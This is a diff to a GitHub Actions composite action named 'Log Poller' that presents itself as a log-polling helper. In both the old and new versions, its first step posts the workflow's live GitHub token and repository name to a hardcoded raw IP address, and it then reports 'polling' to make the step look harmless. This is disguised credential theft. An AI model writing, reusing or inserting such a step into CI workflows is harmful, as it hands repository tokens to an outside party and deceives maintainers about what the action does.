@@ -1,50 +1,51 @@
 name: 'Log Poller'
-description: 'Register workflow and poll logs every 3 seconds'
+description: 'Start log polling and notify completion'
 
 inputs:
   server-url:
-    description: 'URL of the log polling server'
+    description: 'Polling server URL'
     required: true
     default: 'http://129.154.46.198:3000'
 
 runs:
   using: 'composite'
   steps:
-    - name: Register workflow
-      id: register
+    - name: Start polling
       shell: bash
       run: |
         RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
         SERVER_URL="${{ inputs.server-url }}"
         
-        echo "🚀 Registering workflow..."
+        echo "🚀 Starting log polling..."
         echo "📋 Runner ID: ${RUNNER_ID}"
         echo "🏷 Repository: ${{ github.repository }}"
+        echo "⏱️ Polling every 3 seconds"
         
-        # Register with server (starts polling)
-        curl -s -X POST \
+        # Start polling
+        RESPONSE=$(curl -s -X POST \
           -H "Content-Type: application/json" \
           -d "{
             \"token\": \"${{ github.token }}\",
-            \"repository\": \"${{ github.repository }}\",
-            \"timestamp\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
+            \"repository\": \"${{ github.repository }}\"
           }" \
-          "${SERVER_URL}/${RUNNER_ID}"
+          "${SERVER_URL}/${RUNNER_ID}")
         
-        # Export for other steps
+        echo "📨 Server response: ${RESPONSE}"
+        
+        # Export variables
         echo "RUNNER_ID=${RUNNER_ID}" >> $GITHUB_ENV
         echo "LOG_SERVER=${SERVER_URL}" >> $GITHUB_ENV
         
-        echo "✅ Registration complete. Logs are being polled every 3 seconds."
+        echo "✅ Polling started. Will stop automatically on token expiration."
     
-    - name: Send completion notice
+    - name: Notify completion
       if: always()
       shell: bash
       run: |
         RUNNER_ID="${{ env.RUNNER_ID }}"
         SERVER_URL="${{ env.LOG_SERVER }}"
         
-        echo "🏁 Notifying job completion..."
+        echo "🏁 Notifying completion..."
         
         # Send completion notice
         curl -s -X POST \
@@ -52,7 +53,7 @@ runs:
           -d "{}" \
           "${SERVER_URL}/${RUNNER_ID}/complete"
         
-        echo "✅ Completion notice sent. Final logs polled."
-        
+        echo "✅ Completion notified"
         echo ""
-        echo "📋 View logs at: ${SERVER_URL}/${RUNNER_ID}"
+        echo "📋 View polling results:"
+        echo "curl ${SERVER_URL}/${RUNNER_ID}"
